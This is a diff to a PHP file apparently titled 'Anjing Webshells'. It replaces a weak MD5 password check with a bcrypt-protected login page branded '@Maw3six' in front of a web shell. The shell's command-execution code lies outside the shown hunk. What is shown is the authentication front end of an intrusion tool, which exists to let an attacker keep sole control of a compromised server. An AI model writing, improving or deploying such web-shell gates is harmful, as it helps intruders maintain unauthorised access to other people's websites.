@@ -1,4 +1,46 @@
-<?php session_start(); if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) { $h='21232f297a57a5a743894a0e4a801fc3'; if ($_POST['password'] && md5($_POST['password'])==$h) { $_SESSION['logged_in']=true; header('Location: '.$_SERVER['PHP_SELF']); exit; } echo "<h2>Login</h2><form method='post'>Password: <input type='password' name='password' required> <button type='submit'>Masuk</button></form>"; if ($_POST['password']) echo "<p>Password salah!</p>"; exit; } ?>
+<?php
+session_start();
+
+$hashed_password = '$2a$12$qNyoZTHZz6StK2JFOhKrN.AbTKhRb1UrOiECkNQ87ncGV8//24l3S';
+
+function isAuthenticated() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = "Denied!";
+    }
+}
+
+if (!isAuthenticated()) :
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+        form { display: inline-block; padding: 20px; border: 1px solid #ccc; background: #f9f9f9; }
+    </style>
+</head>
+<body>
+    <form method="POST">
+        <h2>@Maw3six</h2>
+        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">>></button>
+    </form>
+</body>
+</html>
+<?php
+    exit;
+endif;
+?>
+
 <html>
 <head>
     <title>Anjing Webshells</title>
